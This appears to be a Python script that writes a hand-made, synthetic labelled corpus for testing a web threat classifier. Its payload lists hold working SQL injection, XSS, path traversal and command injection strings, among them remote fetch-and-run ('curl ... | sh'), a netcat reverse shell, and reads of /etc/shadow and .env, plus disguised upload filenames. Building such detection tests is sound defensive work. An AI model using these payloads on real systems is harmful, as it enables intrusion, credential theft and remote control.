"""
make_threat_corpus.py

Writes ml/threat_corpus.json: a hand-written labelled corpus used to evaluate
src/lib/threatClassifier.ts. The attack strings follow the standard public
OWASP-style payload families (tautologies, UNION SELECT, script tags, ../
traversal, shell chaining). The benign strings deliberately include look-alike
text (apostrophes, '&', 'select', 'drop me a line') to expose false positives.
This corpus is SYNTHETIC and authored by us, not captured traffic.
"""

import json
from pathlib import Path

ATTACKS = {
    "sql_injection": [
        "' OR '1'='1", "admin' --", "1; DROP TABLE users",
        "' UNION SELECT username,password FROM users--", "1' OR 1=1#",
        "x' AND SLEEP(5)--", "\" or \"\"=\"", "1 UNION ALL SELECT NULL,NULL",
        "'; EXEC xp_cmdshell('dir')--", "a' or 'a'='a", "test'/**/OR/**/1=1--",
        "1) OR (1=1", "'; WAITFOR DELAY '0:0:5'--", "%27%20OR%20%271%27%3D%271",
        "1; DELETE FROM files",
    ],
    "xss": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)", "<svg onload=alert(1)>",
        "<iframe src=//evil.com>", "\"><script src=//x.js></script>",
        "<body onload=fetch('//x')>", "%3Cscript%3Ealert(1)%3C/script%3E",
        "<a href=\"javascript:void(0)\" onclick=alert(1)>", "<SCRIPT SRC=http://x/a.js>",
        "<input onfocus=alert(1) autofocus>", "<img src=1 onerror=eval(atob('YQ=='))>",
    ],
    "path_traversal": [
        "../../etc/passwd", "..\\..\\windows\\system32",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "/etc/shadow", "....//....//etc/passwd",
        "../../../../proc/self/environ", "files/../../secret", "C:\\Windows\\win.ini",
        "..%2f..%2fadmin", "../.env", "/proc/self/cmdline", "..\\..\\boot.ini",
    ],
    "command_injection": [
        "; cat /etc/hosts", "| whoami", "$(id)", "`uname -a`",
        "&& curl http://x/s.sh | sh", "; ls -la", "| nc -e /bin/sh 1.2.3.4 9",
        "a; wget http://evil/x", "`whoami`", "| bash -i", "; powershell -c calc",
        "& cmd /c dir",
    ],
}

BENIGN = [
    "hello world", "MyP@ssw0rd!2024", "ABCD-1234", "summer2025",
    "correct horse battery staple", "Report Q3 final", "john.doe@example.com",
    "Password with spaces here", "X7K2-LMN9", "it's fine", "O'Brien",
    "rock & roll", "50% off today", "a-b-c-d", "What is 2+2?", "design_v2.pdf",
    "price < 100 and > 50", "Mary's file", "ticket #4521", "C++ notes",
    "user_name", "2024-10-06", "100% sure", "hash#tag", "email me at a@b.co",
    "R&D budget", "Dr. Smith's plan", "path/to/file", "notes (draft)",
    "pa$$word", "tom and jerry", "select a team", "drop me a line",
    "update on the plan", "insert coin", "order by Friday", "one or two",
    "this and that", "x = y", "name=value",
]

UPLOADS = [
    # malicious
    ("invoice.pdf.exe", "application/x-msdownload", None, 1),
    ("photo.jpg.js", "text/javascript", None, 1),
    ("shell.php", "application/x-php", None, 1),
    ("setup.exe", "application/octet-stream", None, 1),
    ("run.ps1", "text/plain", None, 1),
    ("macro.vbs", "text/plain", None, 1),
    ("app.apk", "application/vnd.android.package-archive", None, 1),
    ("readme.txt.bat", "text/plain", None, 1),
    ("backdoor.jsp", "text/plain", None, 1),
    ("pic.png", "text/html", None, 1),
    ("report.pdf", "image/png", None, 1),
    ("data.csv", "application/x-sh", None, 1),
    ("document.pdf", "application/pdf", [77, 90, 144, 0], 1),
    ("image.jpg", "image/jpeg", [127, 69, 76, 70], 1),
    ("notes.txt", "text/plain", [35, 33, 47, 98], 1),
    ("evil\u202egpj.exe", "", None, 1),
    # benign
    ("report.pdf", "application/pdf", [37, 80, 68, 70], 0),
    ("holiday.jpg", "image/jpeg", [255, 216, 255, 224], 0),
    ("logo.png", "image/png", [137, 80, 78, 71], 0),
    ("notes.txt", "text/plain", None, 0),
    ("budget.csv", "text/csv", None, 0),
    ("archive.zip", "application/zip", [80, 75, 3, 4], 0),
    ("thesis.final.v2.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", None, 0),
    ("slides.pptx", "application/vnd.openxmlformats-officedocument.presentationml.presentation", None, 0),
    ("my.photo.2024.jpeg", "image/jpeg", None, 0),
    ("data.v1.csv", "application/vnd.ms-excel", None, 0),
    ("readme", "text/plain", None, 0),
    ("scan.PDF", "application/pdf", None, 0),
    ("video.mp4", "video/mp4", None, 0),
    ("song.mp3", "audio/mpeg", None, 0),
    ("invoice 2024.xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", None, 0),
    ("notes.md", "text/markdown", None, 0),
    ("icon.gif", "image/gif", None, 0),
]


def main() -> None:
    payloads = [{"text": t, "label": c} for c, items in ATTACKS.items() for t in items]
    payloads += [{"text": t, "label": "none"} for t in BENIGN]
    uploads = []
    for name, mime, head, bad in UPLOADS:
        row = {"name": name, "type": mime, "label": "malicious_upload" if bad else "none"}
        if head is not None:
            row["head"] = head
        uploads.append(row)
    out = Path(__file__).parent / "threat_corpus.json"
    out.write_text(json.dumps({"payloads": payloads, "uploads": uploads}, indent=1), encoding="utf-8")
    print(f"wrote {len(payloads)} payloads, {len(uploads)} uploads")


if __name__ == "__main__":
    main()
